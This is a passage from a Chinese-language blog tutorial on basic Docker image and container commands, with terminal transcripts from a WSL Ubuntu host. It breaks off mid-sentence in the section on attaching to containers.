<h3 id="docker命令">docker命令</h3>
<h4 id="docker基本命令">docker基本命令</h4>
<h5 id="版本信息">版本信息</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker version</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/home/docker# docker version</span><br><span class="line">Client: Docker Engine - Community</span><br><span class="line"> Version:           20.10.17</span><br><span class="line"> API version:       1.41</span><br><span class="line"> Go version:        go1.17.11</span><br><span class="line"> Git commit:        100c701</span><br><span class="line"> Built:             Mon Jun  6 23:02:57 2022</span><br><span class="line"> OS/Arch:           linux/amd64</span><br><span class="line"> Context:           default</span><br><span class="line"> Experimental:      true</span><br><span class="line"></span><br><span class="line">Server: Docker Engine - Community</span><br><span class="line"> Engine:</span><br><span class="line">  Version:          20.10.17</span><br><span class="line">  API version:      1.41 (minimum version 1.12)</span><br><span class="line">  Go version:       go1.17.11</span><br><span class="line">  Git commit:       a89b842</span><br><span class="line">  Built:            Mon Jun  6 23:01:03 2022</span><br><span class="line">  OS/Arch:          linux/amd64</span><br><span class="line">  Experimental:     false</span><br><span class="line"> containerd:</span><br><span class="line">  Version:          1.6.6</span><br><span class="line">  GitCommit:        10c12954828e7c7c9b6e0ea9b0c02b01407d3ae1</span><br><span class="line"> runc:</span><br><span class="line">  Version:          1.1.2</span><br><span class="line">  GitCommit:        v1.1.2-0-ga916309</span><br><span class="line"> docker-init:</span><br><span class="line">  Version:          0.19.0</span><br><span class="line">  GitCommit:        de40ad0</span><br></pre></td></tr></table></figure>
<h5 id="系统信息">系统信息</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/home/docker# docker info</span><br><span class="line">Client:</span><br><span class="line"> Context:    default</span><br><span class="line"> Debug Mode: false</span><br><span class="line"> Plugins:</span><br><span class="line">  app: Docker App (Docker Inc., v0.9.1-beta3)</span><br><span class="line">  buildx: Docker Buildx (Docker Inc., v0.8.2-docker)</span><br><span class="line">  scan: Docker Scan (Docker Inc., v0.17.0)</span><br><span class="line"></span><br><span class="line">Server:</span><br><span class="line"> Containers: 1</span><br><span class="line">  Running: 1</span><br><span class="line">  Paused: 0</span><br><span class="line">  Stopped: 0</span><br><span class="line"> Images: 3</span><br><span class="line"> Server Version: 20.10.17</span><br><span class="line"> Storage Driver: overlay2</span><br><span class="line">  Backing Filesystem: extfs</span><br><span class="line">  Supports d_type: true</span><br><span class="line">  Native Overlay Diff: true</span><br><span class="line">  userxattr: false</span><br><span class="line"> Logging Driver: json-file</span><br><span class="line"> Cgroup Driver: cgroupfs</span><br><span class="line"> Cgroup Version: 1</span><br><span class="line"> Plugins:</span><br><span class="line">  Volume: local</span><br><span class="line">  Network: bridge host ipvlan macvlan null overlay</span><br><span class="line">  Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog</span><br><span class="line"> Swarm: inactive</span><br><span class="line"> Runtimes: io.containerd.runc.v2 io.containerd.runtime.v1.linux runc</span><br><span class="line"> Default Runtime: runc</span><br><span class="line"> Init Binary: docker-init</span><br><span class="line"> containerd version: 10c12954828e7c7c9b6e0ea9b0c02b01407d3ae1</span><br><span class="line"> runc version: v1.1.2-0-ga916309</span><br><span class="line"> init version: de40ad0</span><br><span class="line"> Security Options:</span><br><span class="line">  seccomp</span><br><span class="line">   Profile: default</span><br><span class="line"> Kernel Version: 5.10.102.1-microsoft-standard-WSL2		;wsl系统内核版本信息</span><br><span class="line"> Operating System: Ubuntu 20.04.4 LTS			;wsl的操作系统信息</span><br><span class="line"> OSType: linux</span><br><span class="line"> Architecture: x86_64</span><br><span class="line"> CPUs: 8</span><br><span class="line"> Total Memory: 3.831GiB</span><br><span class="line"> Name: Executor</span><br><span class="line"> ID: 7LD5:E4VA:BGYO:LUWX:AUSB:2MM2:2RI2:DULK:QK6O:YFNA:REKG:CUFA</span><br><span class="line"> Docker Root Dir: /var/lib/docker</span><br><span class="line"> Debug Mode: false</span><br><span class="line"> Registry: https://index.docker.io/v1/</span><br><span class="line"> Labels:</span><br><span class="line"> Experimental: false</span><br><span class="line"> Insecure Registries:</span><br><span class="line">  127.0.0.0/8</span><br><span class="line"> Registry Mirrors:</span><br><span class="line">  https://hub-mirror.c.163.com/</span><br><span class="line">  https://ustc-edu-cn.mirror.aliyuncs.com/</span><br><span class="line">  https://ghcr.io/</span><br><span class="line">  https://mirror.baidubce.com/</span><br><span class="line"> Live Restore Enabled: false</span><br><span class="line"></span><br><span class="line">WARNING: No blkio throttle.read_bps_device support</span><br><span class="line">WARNING: No blkio throttle.write_bps_device support</span><br><span class="line">WARNING: No blkio throttle.read_iops_device support</span><br><span class="line">WARNING: No blkio throttle.write_iops_device support</span><br></pre></td></tr></table></figure>
<h4 id="docker镜像的使用">docker镜像的使用</h4>
<h5 id="查找注册仓库中的镜像">查找注册仓库中的镜像</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search &lt;镜像&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/home/docker# docker search httpd</span><br><span class="line">NAME                                 DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED</span><br><span class="line">httpd                                The Apache HTTP Server Project                  4090      [OK]</span><br><span class="line">centos/httpd-24-centos7              Platform <span class="keyword">for</span> running Apache httpd 2.4 or bui…   44</span><br><span class="line">centos/httpd                                                                         35                   [OK]</span><br><span class="line">clearlinux/httpd                     httpd HyperText Transfer Protocol (HTTP) ser…   2</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>其中STARS表明该镜像的权威性</p>
<p>OFFICIAL表明该镜像是否为官方镜像</p>
<h5 id="从仓库拉取镜像">从仓库拉取镜像</h5>
<p>要私人定制一个花里胡哨的ubuntu镜像,首先得有一个干净的基础镜像</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull &lt;仓库名&gt;:&lt;标签&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里仓库名一般就是操作系统名比如ubuntu,标签就是操作系统版本比如20.04</p>
<p>因为docker仓库一般以操作系统命名,其中的镜像文件一般以对应操作系统版本号命名</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# docker pull ubuntu:20.04</span><br><span class="line">20.04: Pulling from library/ubuntu</span><br><span class="line">d7bfe07ed847: Pull complete</span><br><span class="line">Digest: sha256:fd92c36d3cb9b1d027c4d2a72c6bf0125da82425fc2ca37c414d4f010180dc19</span><br><span class="line">Status: Downloaded newer image for ubuntu:20.04</span><br><span class="line">docker.io/library/ubuntu:20.04</span><br></pre></td></tr></table></figure>
<h5 id="查看本地镜像列表">查看本地镜像列表</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# docker images</span><br><span class="line">REPOSITORY                    TAG       IMAGE ID       CREATED       SIZE</span><br><span class="line">ubuntu                        20.04     20fffa419e3a   6 weeks ago   72.8MB</span><br><span class="line">ansible/ubuntu14.04-ansible   latest    4621d4fe2959   6 years ago   461MB</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>栏目</th>
<th>意义</th>
</tr>
</thead>
<tbody>
<tr>
<td>RESPOSITORY</td>
<td>镜像仓库源</td>
</tr>
<tr>
<td>TAG</td>
<td>镜像标签</td>
</tr>
<tr>
<td>IMAGE ID</td>
<td>镜像ID</td>
</tr>
<tr>
<td>CREATED</td>
<td>镜像创建时间</td>
</tr>
<tr>
<td>SIZE</td>
<td>镜像大小</td>
</tr>
</tbody>
</table>
<p>可以使用<code>仓库源:镜像标签</code>来指定一个唯一的镜像,也可以直接使用镜像ID指定一个唯一的镜像</p>
<h5 id="删除本地镜像">删除本地镜像</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi &lt;镜像&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里镜像或者是仓库原:镜像标签指定,或者是镜像ID指定</p>
<p>甚至不用输全信息就可以指定唯一一个镜像</p>
<p>比如只输入镜像ID的前两位或者前三位</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# docker images</span><br><span class="line">REPOSITORY                    TAG       IMAGE ID       CREATED        SIZE</span><br><span class="line">ubuntu                        20.04     20fffa419e3a   6 weeks ago    72.8MB</span><br><span class="line">ubuntu                        18.04     5a214d77f5d7   9 months ago   63.1MB</span><br><span class="line">ansible/ubuntu14.04-ansible   latest    4621d4fe2959   6 years ago    461MB</span><br><span class="line">root@Executor:~# docker rmi 5a</span><br><span class="line">Untagged: ubuntu:18.04</span><br><span class="line">Untagged: ubuntu@sha256:0fedbd5bd9fb72089c7bbca476949e10593cebed9b1fb9edf5b79dbbacddd7d6</span><br><span class="line">Deleted: sha256:5a214d77f5d747e6ed81632310baa6190301feeb875cf6bf9da560108fa09972</span><br><span class="line">Deleted: sha256:824bf068fd3dc3ad967022f187d85250eb052f61fe158486b2df4e002f6f984e</span><br></pre></td></tr></table></figure>
<p>这里使用<code>ubuntu:18.04</code>镜像的ID号删除,只需要指定前2位</p>
<blockquote>
<p>正在被引用的镜像不能被删除(该镜像有运行容器时不能删除)</p>
</blockquote>
<h5 id="创建镜像">创建镜像</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit</span><br></pre></td></tr></table></figure>
<p>在一个ubuntu20.04的<strong>容器中</strong>(不是wsl中,是wsl的docker容器中)安装ssh之后创建镜像,然后使用新镜像创建容器,看看ssh还有没有</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/home/docker# docker commit -m=&quot;ssh&quot; -a=&quot;dustball&quot; 49e5c3d8f7c6 ssh/ubuntu</span><br><span class="line">sha256:886ba4c00ba4b506eb6070d729ff9282a5220717153f3fb8a1f20e7b9f69a236</span><br></pre></td></tr></table></figure>
<blockquote>
<p>-m提交描述信息</p>
<p>-a指定作者</p>
<p>ssh/ubuntu:镜像名称</p>
</blockquote>
<p>sha256码表明镜像创建完毕,使用<code>docker images</code>观察本地所有镜像</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/home/docker# docker images</span><br><span class="line">REPOSITORY   TAG       IMAGE ID       CREATED          SIZE</span><br><span class="line">ssh/ubuntu   latest    886ba4c00ba4   27 seconds ago   235MB</span><br><span class="line">ubuntu       20.04     20fffa419e3a   6 weeks ago      72.8MB</span><br></pre></td></tr></table></figure>
<p>新镜像ssh/ubuntu显然比安装ssh之前的镜像ubuntu大好多</p>
<p>用新镜像创建容器并尝试运行ssh,发现是有的</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/home/docker# docker run -it ssh/ubuntu bash</span><br><span class="line">root@2e155d040460:/# ssh</span><br><span class="line">usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]</span><br><span class="line">           [-b bind_address] [-c cipher_spec] [-D [bind_address:]port]</span><br><span class="line">           [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11]</span><br><span class="line">           [-i identity_file] [-J [user@]host[:port]] [-L address]</span><br><span class="line">           [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]</span><br><span class="line">           [-Q query_option] [-R address] [-S ctl_path] [-W host:port]</span><br><span class="line">           [-w local_tun[:remote_tun]] destination [command]</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter /home/kali/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so --set-rpath /home/kali/glibc-all-in-one/libs/2.23-0ubuntu3_amd64 target_file</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ patchelf --set-interpreter /home/kali/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so --set-rpath /home/kali/glibc-all-in-one/libs/2.23-0ubuntu3_amd64 test</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="docker容器的使用">docker容器的使用</h4>
<h5 id="创建删除容器">创建/删除容器</h5>
<p><strong>创建容器</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker create [启动选项] &lt;镜像&gt; [命令行] </span><br></pre></td></tr></table></figure>
<p>比如创建一个终端上交互启动,默认自动执行/bin/bash命令的ubuntu:20.04容器</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# docker create -t -i ubuntu:20.04 /bin/bash</span><br><span class="line">e94cf81e102f33880cc1e21d9e50985eaac9927642d925009c4cadc761bb2d8c</span><br><span class="line">root@Executor:~# docker ps -a | grep e94</span><br><span class="line">e94cf81e102f   ubuntu:20.04                  &quot;/bin/bash&quot;   20 seconds ago   Created                                                                 quirky_chatelet</span><br></pre></td></tr></table></figure>
<p>已经创建但是从未运行过的容器,其状态为"Created"</p>
<blockquote>
<p>这里命令行的作用是,规定容器启动后要自动执行的命令</p>
<p><code>/bin/bash</code>意思是启动后立刻执行<code>/bin/bash</code>这条命令,如果之前默认的shell是bash则无所谓,如果之前默认的shell是sh,tsh等等其他shell,则改为使用bash</p>
</blockquote>
<blockquote>
<p>关于"启动选项"和"命令行参数"</p>
<p>一定要分清两个东西,前者规定的是如何启动容器,后者规定的是启动后容器立刻自动干啥</p>
</blockquote>
<p><strong>删除容器</strong>前提是该容器没有被运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm &lt;容器&gt;</span><br></pre></td></tr></table></figure>
<p>运行状态的容器需要强制删除</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm -f &lt;容器&gt;</span><br></pre></td></tr></table></figure>
<p>删除所有容器</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# docker  <span class="built_in">rm</span> $(docker ps -a -q)</span><br><span class="line">e94cf81e102f</span><br><span class="line">205041549d08</span><br><span class="line">fa210e84dd67</span><br><span class="line">bce56d6e5727</span><br><span class="line">08142959bdde</span><br><span class="line">dd33995e37ab</span><br><span class="line">3a666c93b635</span><br><span class="line">b458aa62f64c</span><br><span class="line">85c3fa6b67d3</span><br><span class="line">3519c8f7070f</span><br><span class="line">79543801ed50</span><br><span class="line">897a086a85f4</span><br></pre></td></tr></table></figure>
<p>或者使用<code>docker container prune</code></p>
<h5 id="查看所有容器">查看所有容器</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE                         COMMAND       CREATED          STATUS                        PORTS     NAMES</span><br><span class="line">08142959bdde   ubuntu:20.04                  &quot;bash&quot;        21 minutes ago   Exited (0) 18 minutes ago               awesome_austin</span><br><span class="line">dd33995e37ab   ubuntu:20.04                  &quot;bash&quot;        23 minutes ago   Exited (0) 23 minutes ago               festive_lamarr</span><br><span class="line">3a666c93b635   ubuntu:20.04                  &quot;bash&quot;        24 minutes ago   Exited (129) 38 seconds ago             quirky_kilby</span><br><span class="line">b458aa62f64c   ubuntu:20.04                  &quot;-t&quot;          24 minutes ago   Created                                 angry_mclean</span><br><span class="line">85c3fa6b67d3   ubuntu:20.04                  &quot;bash&quot;        24 minutes ago   Exited (0) 24 minutes ago               quizzical_grothendieck</span><br><span class="line">3519c8f7070f   ubuntu:20.04                  &quot;bash&quot;        25 minutes ago   Exited (0) 25 minutes ago               affectionate_kare</span><br><span class="line">79543801ed50   ubuntu:20.04                  &quot;bash&quot;        26 minutes ago   Exited (0) 23 minutes ago               sleepy_driscoll</span><br><span class="line">897a086a85f4   ansible/ubuntu14.04-ansible   &quot;/bin/bash&quot;   2 hours ago      Exited (255) 2 hours ago                friendly_bhaskara</span><br></pre></td></tr></table></figure>
<table>
<colgroup>
<col style="width: 15%" />
<col style="width: 10%" />
<col style="width: 75%" />
</colgroup>
<thead>
<tr>
<th>栏目</th>
<th>意义</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>CONTAINER ID</td>
<td>容器</td>
<td>注意不是镜像id,本地所有容器都有一个自己独特的id,用于区分和索引</td>
</tr>
<tr>
<td>IMAGE</td>
<td>镜像</td>
<td>容器是从哪个镜像创建的</td>
</tr>
<tr>
<td>COMMAND</td>
<td>命令行</td>
<td>create创建或者run创建并启动时的命令行参数</td>
</tr>
<tr>
<td>CREATED</td>
<td>创建时间</td>
<td>使用docker run创建该容器的时间</td>
</tr>
<tr>
<td>STATUS</td>
<td>状态</td>
<td>created（已创建）<br />restarting（重启中）<br />running（运行中）
<br />removing（迁移中） <br />paused（暂停） <br />exited（停止）
<br />dead（死亡）</td>
</tr>
<tr>
<td>PORTS</td>
<td>端口</td>
<td>容器的端口信息和使用的连接类型（tcp）</td>
</tr>
<tr>
<td>NAMES</td>
<td>名称</td>
<td>Docker自动给每个容器都起一个名字,格式是:形容词__名<br />awesome_austin<br />festive_lamarr<br />...<br />如果要人为给容器起名字,需要在docker
run的命令行上加上<code>--name=&lt;名字&gt;</code></td>
</tr>
</tbody>
</table>
<h5 id="运行停止容器">运行/停止容器</h5>
<p>容器用create创建之后不会执行,需要start命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker start [启动选项] &lt;容器&gt;</span><br><span class="line">docker start [启动选项] &lt;容器1&gt; &lt;容器2&gt; ...</span><br><span class="line">docker stop [停止选项] &lt;容器&gt;</span><br><span class="line">docker stop [停止选项] &lt;容器1&gt;&lt;容器2&gt; ...</span><br></pre></td></tr></table></figure>
<p>启动选项要么是<code>-a(attach)</code>,要么是<code>-i(interactive)</code></p>
<p>对于<code>stop</code>(或者<code>kill</code>)指令,其停止选项可以是多长时间之后停止</p>
<blockquote>
<p>关于"启动选项"和"命令行参数"</p>
<p>一定要分清两个东西,前者规定的是如何启动容器,后者规定的是启动后容器立刻自动干啥</p>
<p>ps -a列出的COMMAND栏目,这是docker
create时指定的<strong>命令行参数</strong>,它告诉容器启动后自动做什么</p>
<p>而docker
start的<strong>启动选项</strong>只有两种,-a或者-i,区别是:</p>
<p>-a只会将容器的标准输出绑定到当前终端,<code>docker start -a &lt;容器&gt;</code>执行后,这时候可以看到容器的输出<code>root@容器id</code></p>
<p>但是尝试在终端输入什么命令,都不会有结果,但是终端也没有阻塞,可以一直输入.</p>
<p>这是因为-a启动的容器,其标准输入并没有绑定到终端,因此我们在终端的任何输入都没有发往容器.</p>
<p>也就是说我们可以从终端上接收docker容器的输出,但是没法给他输入</p>
<p>这貌似很奇怪,因为没有输入哪来的输出呢?</p>
<p>实际上可以在创建容器的时候指定<strong>命令行参数</strong>,让容器启动就自动执行一些命令,此时这些命令的输出就可以打印到终端</p>
<p>比如创建一个在后台自动每1秒执行一次打印"helloworld"的容器,然后用<code>-a</code>启动参数启动它,就可以看到它一直向终端输出<code>helloworld</code>了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# docker create ubuntu:20.04 /bin/sh -c &quot;while true; do echo hello world; sleep 1; done&quot;</span><br><span class="line">167d2e45de172117166431467875f3e44f81a29fbaa1e786fecf2caf77227d25</span><br><span class="line">root@Executor:~# docker start -a 167</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>-i会将容器的标准输入绑定到当前终端</p>
</blockquote>
<p>使用<code>docker start</code>默认后台运行容器,该命令执行后终端环境还是在wsl中,相应容器已经在后台运行</p>
<p>如果想要让容器在前台与我们交互,可以使用<code>-i</code>启动选项(前提是,create创建容器的时候有加入-it选项,否则start使用-i选项无效)</p>
<p>即:</p>
<p><strong>使用<code>docker create -it &lt;容器&gt;</code>这样创建的容器,使用<code>docker start &lt;容器&gt;</code>会在后台运行(即使没有长期任务也会一直运行),使用<code>docker start -i &lt;容器&gt;</code>会在前台交互.</strong></p>
<p><strong>使用<code>docker create &lt;容器&gt;</code>这样创建的容器,最多可以<code>docker start -a &lt;容器&gt;</code>绑定输出(前提是create时命令行上有长期的任务),但是<code>docker start -i &lt;容器&gt;</code>无效,如果创建容器时命令行上没有给容器指定一个长期的任务,那么后台运行的容器会立刻停止</strong></p>
<h5 id="创建运行容器">创建+运行容器</h5>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br></pre></td></tr></table></figure>
<blockquote>
<p>其作用相当于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker create [OPTIONS] &lt;镜像&gt; [COMMAND][ARG...]</span><br><span class="line">docker start [OPTIONS] &lt;容器&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>OPTIONS是docker start 的启动选项啊</p>
<p>COMMAND是docker create的命令行参数</p>
<p>一定要分清两者</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -t -i &lt;镜像&gt; /bin/bash</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里镜像可以是镜像id,也可以是仓库源:镜像标签</p>
<p>-it一起用,意思是让docker分配一个伪终端,并绑定到容器的标准输入</p>
<p>说人话-t作用是加上<code>root@容器号:</code>这种命令提示,不用-t,只有-i也可以进行命令交互,但是不会有这种提示</p>
<p>后面命令行/bin/bash意思是,启动后自动运行bash(虽然默认也是运行的bash,但是可能有些容器默认运行sh),使用bash这个shell进行交互</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# docker run -t -i ubuntu:20.04</span><br><span class="line">root@08142959bdde:/#</span><br></pre></td></tr></table></figure>
<p>可以发现主机名已经由<code>Executor</code>编变成了容器的id号,现在的终端已经是docker内部环境了</p>
<p>这里容器id和镜像id不同,本地的每个容器都有一个不同的id</p>
<p>如果要退出容器到wsl,只需要在docker容器的终端中输入exit</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# docker run -t -i ubuntu:20.04</span><br><span class="line">root@08142959bdde:/# exit</span><br><span class="line">exit</span><br><span class="line">root@Executor:~#</span><br></pre></td></tr></table></figure>
<p>主机名又变回Executor说明目前已经在wsl中了</p>
<p>Exit命令执行后,该docker容器立刻停止.后来如果还想继续使用则需要在wsl中使用docker
start命令</p>
<blockquote>
<p>创建容器时Docker干了啥</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220722210940799.png"
alt="image-20220722210940799" />
<figcaption aria-hidden="true">image-20220722210940799</figcaption>
</figure>
<p>单从"桥接一个虚拟接口到容器",就知道物理机和docker容器在同一个网段</p>
</blockquote>
<p><strong>后台运行</strong></p>
<p>刚才已经知道,直接用<code>docker run -t -i ubuntu:20.04</code>这种命令创建容器时,创建容器后终端环境是容器中环境,主机名会变成docker容器号</p>
<p>而现在只想让docker容器运行,但是终端依然是wsl的环境,不进入docker容器,应该咋整呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d &lt;镜像&gt; &lt;命令行参数&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# docker run -d -it ubuntu:20.04</span><br><span class="line">fa210e84dd679b8402a78ca404988fe7ec031f0475385631f95fb497d764e86b</span><br><span class="line">root@Executor:~# docker ps -a | grep fa21</span><br><span class="line">fa210e84dd67   ubuntu:20.04                  &quot;bash&quot;        12 seconds ago      Up 12 seconds                            intelligent_austin</span><br><span class="line">root@Executor:~#</span><br></pre></td></tr></table></figure>
<p>可以发现,<code>run -d</code>创建容器并运行之后,终端上还是显示<code>root@Executor</code>表明仍然在wsl中,没有进到容器里</p>
<p>相当于<code>docker create -it &lt;容器&gt;</code>然后<code>docker run &lt;容器&gt;</code></p>
<h5 id="进入退出容器">进入/退出容器</h5>
<p>对于正在后台运行的容器,如果想要进入容器与之交互,需要使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker attach [选项] &lt;正在运行的容器&gt; [命令行]</span><br><span class="line">docker exec [选项] &lt;正在运行的容器&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>两者的区别是,</p>
